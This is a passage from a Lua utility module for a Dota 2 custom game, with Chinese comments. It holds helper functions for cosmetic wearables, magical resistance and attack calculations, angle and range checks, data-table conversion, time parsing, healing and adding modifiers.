  mod:FollowEntity(hero, true)
  mod:SetRenderAlpha(100)
  return mod
end

--移除所有基础饰品 不含动态创建的 动态创建的就是最屁股后面的一个实体
--影响 v:AddEffects(EF_NODRAW)
--显示 v:RemoveEffects(EF_NODRAW)
function Util:RemoveBaseWear(hero)
  if hero == nil then return end
  local tab = hero:GetChildren()
  for _, v in pairs(tab) do
    if v:GetClassname() == "dota_item_wearable" then
      v:RemoveSelf()
    end
  end
end

--查找动态创建过的饰品
function Util:FindWear(model, hero)
  if hero == nil then return end
  local tab = hero:GetChildren()
  for _, v in pairs(tab) do
    if v:GetModelName() == model then
      return v
    end
  end
end

--lqjc
function Util:GetSX(ca, sx, value)
  if not ca or not sx or not value then return end
  if not ca:IsRealHero() then return end
  local ID = Util:Hero2ID(ca)
  if not ID then return end
  if ID and SX and SX[ID] then
    if SX[ID][sx] then
      if sx == "lqjc" and SX[ID][sx] > 200 then
        value = value / 3
      else
        value = value / (1 + SX[ID][sx] * 0.01)
      end
    end
  end
  return value
end

-- 展示用魔法抗性（%，贴合面板/减伤：优先引擎读数；否则按基础魔抗 + 修饰器 Bonus 乘法叠乘 + Direct 加算）。
function Util:GetMagicalResistance(unit)
  if not unit or unit:IsNull() then return 0 end

  local function norm_pct(v)
    v = tonumber(v) or 0
    if math.abs(v) <= 1 then return v * 100 end
    return v
  end

  local function read(getter)
    local ok, v = pcall(getter)
    if not ok or v == nil then return nil end
    return norm_pct(v)
  end

  if unit.GetMagicalArmorValue then
    local mag = read(function()
      return unit:GetMagicalArmorValue()
    end)
    if (not mag or math.abs(mag) < 1e-5) and unit.GetMagicalArmorValue then
      local alt = read(function()
        return unit:GetMagicalArmorValue(false)
      end)
      if alt and math.abs(alt) > 1e-5 then
        mag = alt
      end
    end
    if mag and math.abs(mag) > 1e-5 then
      return mag
    end
  end

  local base_pct = 0
  if unit.GetBaseMagicalResistanceValue then
    local b = read(function()
      return unit:GetBaseMagicalResistanceValue()
    end)
    if b then base_pct = b end
  end
  if unit.IsRealHero and unit:IsRealHero() and math.abs(base_pct) < 1e-5 then
    base_pct = 25
  end

  -- 承受魔法伤害比例；每层 MAGICAL_RESISTANCE_BONUS 按百分比点乘到比例上（与常规多来源魔抗一致）
  local dmg_mult = 1 - base_pct / 100
  local direct_sum = 0

  if unit.FindAllModifiers then
    local ok_list, mods = pcall(function()
      return unit:FindAllModifiers()
    end)
    if ok_list and type(mods) == "table" then
      for _, m in ipairs(mods) do
        if m then
          if m.GetModifierMagicalResistanceBonus then
            local okb, b = pcall(function()
              return m:GetModifierMagicalResistanceBonus()
            end)
            if okb and b ~= nil then
              b = tonumber(b) or 0
              if b ~= 0 then
                dmg_mult = dmg_mult * (1 - b / 100)
              end
            end
          end
          if m.GetModifierMagicalResistanceItemUnique then
            local oku, u = pcall(function()
              return m:GetModifierMagicalResistanceItemUnique()
            end)
            if oku and u ~= nil then
              u = tonumber(u) or 0
              if u ~= 0 then
                dmg_mult = dmg_mult * (1 - u / 100)
              end
            end
          end
          if m.GetModifierMagicalResistanceDecrepifyUnique then
            local okx, x = pcall(function()
              return m:GetModifierMagicalResistanceDecrepifyUnique()
            end)
            if okx and x ~= nil then
              x = tonumber(x) or 0
              if x ~= 0 then
                dmg_mult = dmg_mult * (1 - x / 100)
              end
            end
          end
          if m.GetModifierMagicalResistanceDirectModification then
            local okd, d = pcall(function()
              return m:GetModifierMagicalResistanceDirectModification()
            end)
            if okd and d ~= nil then
              direct_sum = direct_sum + (tonumber(d) or 0)
            end
          end
        end
      end
    end
  end

  local eff = (1 - dmg_mult) * 100 + direct_sum
  return eff
end

--判定一个单位的ID 此单位可能是英雄/幻象/召唤物
function Util:Unit2ID(unit)
  if not unit then return end
  if unit:IsNull() then return end
  --是英雄
  if unit.IsRealHero and unit:IsRealHero() then
    return Util:Hero2ID(unit)
  end

  --非英雄则查找拥有者
  local owner = unit:GetOwner()
  if not owner then return end
  if owner:IsNull() then return end
  if owner.IsRealHero and owner:IsRealHero() then
    return Util:Hero2ID(owner)
  end
end

--value查重
function Util:CheckTableKeyRepeat(check)
  local temp = {}
  for i = 1, #check do
    local value = check[i]
    for j = i + 1, #check do
      if value == check[j] then
        table.insert(temp, value)
      end
    end
  end
  if #temp > 0 then
    return temp
  end
end

--index是否是物品
function Util:IsDropItem(index)
  if not index then return end
  local item = self:Index2Entity(index)
  if not item then return end
  if item:IsNull() then return end
  if item:GetClassname() == "dota_item_drop" then
    return true
  end
end

--转换前方最远抵达坐标
function Util:GetForwardFarestPos(ca, ve, farest)
  if not ca then return ve end
  if ca:IsNull() then return ve end

  local cave = ca:GetAbsOrigin()
  local dis = ve - cave
  local len = dis:Length2D()
  local forward = dis:Normalized()

  if len > farest then
    len = farest
  end

  len = math.floor(len)

  for i = len, 1, -1 do
    local tempve = cave + forward * i
    if GridNav:IsTraversable(tempve) then
      return tempve
    end
  end
  return cave
end

--两坐标之间跨越距离百分比
function Util:GetNoReachPercent(ve1, ve2)
  if not ve1 or not ve2 then return end
  local dis = ve2 - ve1
  local len = dis:Length2D()
  local forward = dis:Normalized()

  local num = 0
  for i = len, 1, -1 do
    local tempve = ve1 + forward * i
    if not GridNav:IsTraversable(tempve) then
      num = num + 1
    end
  end
  return math.floor(num / len * 100)
end

--两坐标之间高低差
function Util:GetHeightDis(ve1, ve2)
  if not ve1 or not ve2 then return end
  return math.ceil(math.abs(ve1.z - ve2.z))
end

--[[
--描述--目标是否在英雄朝向的指定偏移角度内(以当前视角为中心角度，然后左右各偏移总角度一半的度数)
版本: V1
作者: 40
日期: 2023-8-24
--]]
function Util:IsInAngle(ca, ta, ang)
  local face = ca:EyeAngles().y       --中心朝向
  local dis = ta:GetAbsOrigin() - ca:GetAbsOrigin()
  local angle = VectorToAngles(dis).y --目标所处角度
  local c = math.abs(math.floor(angle - face))
  local ang = ang / 2
  if c >= (360 - ang) then
    c = math.abs(c - 360)
  end
  if c <= ang then
    return true
  else
    return false
  end
end

--是否在指定角度内
function Util:IsInAngle_dir(ca, ta, ang, dir)
  local face = ca:EyeAngles().y --中心朝向
  local fdir = VectorToAngles(dir).y
  local dis = ta:GetAbsOrigin() - ca:GetAbsOrigin()
  local angle = VectorToAngles(dis).y --目标所处角度
  local c = math.abs(math.floor(angle - fdir))
  local ang = ang / 2
  if c >= (360 - ang) then
    c = math.abs(c - 360)
  end
  if c <= ang then
    return true
  else
    return false
  end
end

--[[
--描述--获取指定范围内随机指定数量(半径不重复)的坐标
版本: V1
作者: 40
日期: 2023-8-10
--]]
function Util:GetRange_point(location, range, radius, num)
  if not range then return end
  if not radius then return end
  if not num then return end
  if not location then return end
  local location_all = {}
  for i = 1, num do
    local k = 0
    local flag = 1
    local radomvtr = Vector(0, 0, 0)
    repeat
      flag = 1
      radomvtr = RandomVector(math.random(0, range)) + location
      for m, n in pairs(location_all) do
        if (radomvtr - n):Length2D() <= radius * 2 then
          flag = 0
          break
        end
      end
      k = k + 1
    until flag == 1 or k >= 30
    if radomvtr ~= Vector(0, 0, 0) then
      table.insert(location_all, radomvtr)
    end
  end
  return location_all
end

--删除modifier_thinker
function Util:RemoveNpcThinker()
  local num = 0
  for i = 1, 10000 do
    local tab = Entities:FindByClassname(nil, "npc_dota_thinker")
    if tab then
      num = num + 1
      print(num)
      UTIL_Remove(tab)
    end
  end
end

--解码路由DATA
function Util:DecodeUIData(keys)
  local data = keys.data
  if data and type(data) == "string" then
    data = JSON.decode(data)
  end
  return data
end

--rolltable
function Util:RollTable(tab)
  if not tab then return end
  local len = #tab
  local int = math.floor(Script_RandomFloat(1, len + 1))
  return tab[int]
end

--添加可叠加但是不共享计算的BUFF,例如感电\燃烧\
--目标\施加者\BUFF名字\技能\BUFF表格\StackCount表格 or nil
function Util:AddModifier_Multiple(ta, ca, md_name, ability, tab, sctab)
  if not ta then return end
  if ta:IsNull() then return end
  if not ca then return end
  if ca:IsNull() then return end
  if not md_name then return end
  local count = 0
  local losttime = 0
  if sctab ~= nil then
    count = sctab.count   --添加的层数 可为负(层数小于0则无效)
    losttime = sctab.lost --该层数失去时间 --为0或者nil视为不定时减少层数
  end
  local has = 0
  if ta:HasModifier(md_name) then
    local modifiers_sum = ta:FindAllModifiersByName(md_name)
    for k, v in pairs(modifiers_sum) do
      if v:GetCaster() == ca then
        has = 1
        if count ~= nil and count ~= 0 then
          v:SetDuration(tab.duration, true)
          local num = v:GetStackCount()
          num = num + count
          if num < 0 then
            num = 0
          end
          v:SetStackCount(num)
          if losttime ~= nil and losttime ~= 0 then
            Timers:CreateTimer(losttime, function()
              if not v then return end
              if v:IsNull() then return end
              local num = v:GetStackCount()
              num = num - count
              if num < 0 then
                num = 0
              end
              v:SetStackCount(num)
            end)
          end
        end
        break
      end
    end
  end
  if has == 0 then
    ta:AddNewModifier(ca, ability, md_name, tab)
  end
end

--bao
function Util:PrintTabWithOutFun(t, indent, done)
  if type(t) ~= "table" then return end

  done = done or {}
  done[t] = true
  indent = indent or 1

  local l = {}
  local isPureArray = true
  local maxIndex = 0

  for k, v in pairs(t) do
    if type(v) ~= "function" then -- 排除函数类型的值
      if type(k) ~= "number" or k % 1 ~= 0 or k <= 0 then
        isPureArray = false
      else
        maxIndex = math.max(maxIndex, k)
      end
      table.insert(l, k)
    end
  end

  if #l ~= maxIndex then
    isPureArray = false
  end

  table.sort(l, function(a, b)
    if type(a) == "number" and type(b) == "number" then
      return a < b
    else
      return tostring(a) < tostring(b)
    end
  end)

  local bracketOpen = isPureArray and "[" or "{"
  local bracketClose = isPureArray and "]," or "},"

  if indent == 1 then
    print(bracketOpen)
  end

  for _, tableKey in ipairs(l) do
    local value = t[tableKey]
    if type(value) ~= "function" and tableKey ~= 'FDesc' then -- 再次排除函数类型的值
      if type(value) == "table" and not done[value] then
        done[value] = true
        print(string.rep("\t", indent) .. tostring(tableKey) .. " = " .. bracketOpen)
        Util:PrintTabWithOutFun(value, indent + 1, done)
        print(string.rep("\t", indent) .. bracketClose)
      else
        local valueString = type(value) == "string" and '"' .. value .. '"' or tostring(value)
        print(string.rep("\t", indent) .. tostring(tableKey) .. " = " .. valueString .. ",")
      end
    end
  end

  if indent == 1 then
    print(bracketClose)
  end
end

--处理导表工具过来的数据
--一、单行表 指定数组里的某个键做键--值
--二、多行表 指定数组里的某个键做键--数组
function Util:ConvertArrSingle(arr, key)
  if not arr or not key then return {} end
  arr = self:ClearEmpty(arr)
  local temp = {}
  for i = 1, #arr do
    local v = arr[i]
    if v[key] then
      temp[v[key]] = v
    else
      print("ConvertArrSingle error")
    end
  end
  return temp
end

function Util:ConvertArrMultiple(arr, key)
  if not arr or not key then return {} end
  arr = self:ClearEmpty(arr)
  local temp = {}
  for i = 1, #arr do
    local v = arr[i]
    if v[key] then
      if not temp[v[key]] then
        temp[v[key]] = {}
      end
      table.insert(temp[v[key]], v)
    else
      print("ConvertArrMultiple error")
    end
  end
  return temp
end

--ISO 8601 转年月日时分秒
function Util:Time2Year(isoString, tzOffset)
  if not isoString then return end
  local pattern = "(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)"
  local year, month, day, hour, min, sec = isoString:match(pattern)
  year, month, day, hour, min, sec = tonumber(year), tonumber(month), tonumber(day), tonumber(hour), tonumber(min),
      tonumber(sec)
  local tzOffset = tzOffset or 8
  hour = hour + tzOffset
  if hour >= 24 then
    hour = hour - 24
    day = day + 1
  elseif hour < 0 then
    hour = 24 + hour
    day = day - 1
  end
  return string.format("%04d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, min, sec)
end

--ISO 8601 转时间戳
function Util:Time2Stamp(isoString)
  local time = self:Time2Year(isoString)
  return self:Utc2Unix(time)
end

--浮点随机数
function Util:RandomFloat(min, max)
  return math.floor(Script_RandomFloat(min, max + 1))
end

--按给定键递规做哈希表分类
function Util:ConvertArrNested(arr, keys, isFinalKeyValue)
  if not arr or #keys == 0 then return arr end
  arr = self:ClearEmpty(arr)
  local key = table.remove(keys, 1)
  local temp = {}

  for i = 1, #arr do
    local v = arr[i]
    if v[key] then
      if not temp[v[key]] then
        -- 最后一个是否组织成哈希表
        if #keys == 0 and isFinalKeyValue then
          temp[v[key]] = v
        else
          temp[v[key]] = {}
        end
      end
      --组织成数组
      if not (#keys == 0 and isFinalKeyValue) then
        table.insert(temp[v[key]], v)
      end
    else
      print("ConvertArrNested error: 没找到key")
    end
  end

  for k, v in pairs(temp) do
    -- 复制 keys 以避免在递归中修改原始列表
    local keysCopy = {}
    for _, key in ipairs(keys) do
      table.insert(keysCopy, key)
    end
    --如果不是最后一个键或isFinalKeyValue不为true，则继续递归
    if not (#keys == 0 and isFinalKeyValue) then
      temp[k] = self:ConvertArrNested(v, keysCopy, isFinalKeyValue)
    end
  end

  return temp
end

--清空empty
function Util:ClearEmpty(arr)
  if not arr then return arr end
  if type(arr) ~= "table" then return arr end
  for i = 1, #arr do
    for k, v in pairs(arr[i]) do
      if type(v) == "string" and v == "empty" then
        arr[i][k] = nil
      end
    end
  end
  return arr
end

--一次roll多个不重复的
function Util:WeightMultiple(tab, count)
  if not tab or not count then return end
  local temp = Util:DeepCopyTab(tab)
  local arr = {}
  for i = 1, count do
    if next(temp) ~= nil then
      local key = self:Weight(temp)
      table.insert(arr, key)
      temp[key] = nil
    end
  end
  return arr
end

--hash 传入一个对象
--membernum 分组成员的数量
function Util:GroupHashTable(hash, membernum)
  if not hash or not membernum then return end
  if type(hash) ~= "table" then return end
  if type(membernum) ~= "number" then return end
  if membernum <= 0 then return end

  local arr = {}
  for index, data in pairs(hash) do
    table.insert(arr, data)
  end

  local GroupArr = {}
  local GroupIndex = 1
  for i = 1, #arr do
    if not GroupArr[GroupIndex] then
      GroupArr[GroupIndex] = {}
    end
    local temp = {}
    table.insert(GroupArr[GroupIndex], arr[i])
    if i % membernum == 0 then
      GroupIndex = GroupIndex + 1
    end
  end
  return GroupArr
end

--单位1S回满血，不能回血使血量超过21E
function Util:Unit_Heal(ca)
  if not ca then return end
  if ca:IsNull() then return end
  local maxhealth = ca:GetMaxHealth()
  if maxhealth <= 2000000000 then
    local nowhealth = ca:GetHealth()
    local needheal = math.floor(maxhealth - nowhealth)
    local times = 10
    local time = 0
    Timers(0, function()
      if not ca then return end
      if ca:IsNull() then return end
      time = time + 1
      ca:Heal(needheal / 10, nil)
      if time < times then
        return 0.1
      end
    end)
  else
    local nowhealth = ca:GetHealth()
    local needheal = math.floor(2000000000 - nowhealth)
    local times = 10
    local time = 0
    if needheal < 0 then
      times = 1
    end
    Timers(0, function()
      if not ca then return end
      if ca:IsNull() then return end
      time = time + 1
      ca:Heal(needheal / 10, nil)
      if time < times then
        return 0.1
      else
        for i = 1, 3 do
          ca:Heal(47000000, nil)
        end
      end
    end)
  end
end

--获得当前攻击力（含绿字/装备；引擎以最小~最大伤害的均值为准）
function Util:GetAverageTrueAttackDamage(ca)
  if not ca then return 0 end
  if ca:IsNull() then return 0 end
  local function raw_avg()
    if ca.GetAverageTrueAttackDamage then
      -- 优先无参：传入参数在部分版本/路径下会被当作攻击目标，易导致与 HUD 不一致（绿字缺失）
      local ok, r = pcall(function()
        return ca:GetAverageTrueAttackDamage()
      end)
      if ok and r ~= nil then
        local n = tonumber(r)
        if n then return n end
      end
      ok, r = pcall(function()
        return ca:GetAverageTrueAttackDamage(ca)
      end)
      if ok and r ~= nil then
        local n = tonumber(r)
        if n then return n end
      end
    end
    return tonumber(ca:GetAttackDamage()) or 0
  end
  local avg = raw_avg()
  if not ca.jcgjl_extra or ca.jcgjl_extra == 1 then
    return avg
  end
  return avg * ca.jcgjl_extra
end

--获得最大生命值
function Util:GetMaxHealth(ca)
  if not ca then return 1 end
  if ca:IsNull() then return 1 end
  if not ca.smzcs_extra then
    return ca:GetMaxHealth()
  else
    if ca.smzcs_extra == 1 then
      return ca:GetMaxHealth()
    else
      return ca:GetMaxHealth() * ca.smzcs_extra
    end
  end
end

--获得当前血量
function Util:GetHealth(ca)
  if not ca then return 1 end
  if ca:IsNull() then return 1 end
  if not ca.smzcs_extra then
    return ca:GetHealth()
  else
    if ca.smzcs_extra == 1 then
      return ca:GetHealth()
    else
      return ca:GetHealth() * ca.smzcs_extra
    end
  end
end

--获得当前主属性值
function Util:GetPrimaryStatValue(ca)
  if not ca then return 0 end
  if ca:IsNull() then return 0 end
  local tab = {
    "strength",
    "agility",
    "intelligence" }
  local name = tab[ca:GetPrimaryAttribute() + 1]
  if name == 'strength' then
    return ca:GetStrength()
  elseif name == 'agility' then
    return ca:GetAgility()
  elseif name == 'intelligence' then
    return ca:GetIntellect(false)
  end
end

--添加BUFF
function Util:AddModifier(ta, ca, ab, name, tab)
  if not ta then return end
  if ta:IsNull() then return end
  if not ca then return end
  if ca:IsNull() then return end
  if not name then return end
  if not tab then return end
  if not ta:IsAlive() then
    ta:SetHealth(1)
    ta:AddNewModifier(ca, ab, name, tab)
    ta:SetHealth(0)
  else
    ta:AddNewModifier(ca, ab, name, tab)
  end
end

--查找敌对单位是否在两点之间指定宽度内
function Util:FindUnitsInLine(ca, pos_a, pos_b, width)
  if not ca then return end
  if not pos_a then return end
  if not pos_b then return end
  local enemy = FindUnitsInLine(
    ca:GetTeam(),
    pos_a,
    pos_b,
    ca,
    width,
    DOTA_UNIT_TARGET_TEAM_ENEMY,
    DOTA_UNIT_TARGET_BASIC + DOTA_UNIT_TARGET_HERO,
    DOTA_UNIT_TARGET_FLAG_NONE)
  local dir = (pos_a - pos_b):Normalized()
  local newdir = RotatePosition(Vector(0, 0, 0), QAngle(0, 90, 0), dir)
  local maxdis = (pos_b + newdir * (width / 2) - pos_a):Length2D()
  local newunit = {}
  if enemy and #enemy > 0 then
    for k, v in pairs(enemy) do
      local vpos = v:GetAbsOrigin()
      if (vpos - pos_a):Length2D() <= maxdis and (vpos - pos_b):Length2D() <= maxdis then
        table.insert(newunit, v)
      end
    end
  end
  return newunit
end

function Util:GetPlayer_accountid(ID)
  local player = PlayerResource:GetPlayer(ID)
  local pid = player:GetPlayerID()
  if not pid then return '0' end
  local Aid = PlayerResource:GetSteamAccountID(pid)
  if not Aid then return '0' end
  local str = tostring(Aid)
  return str
end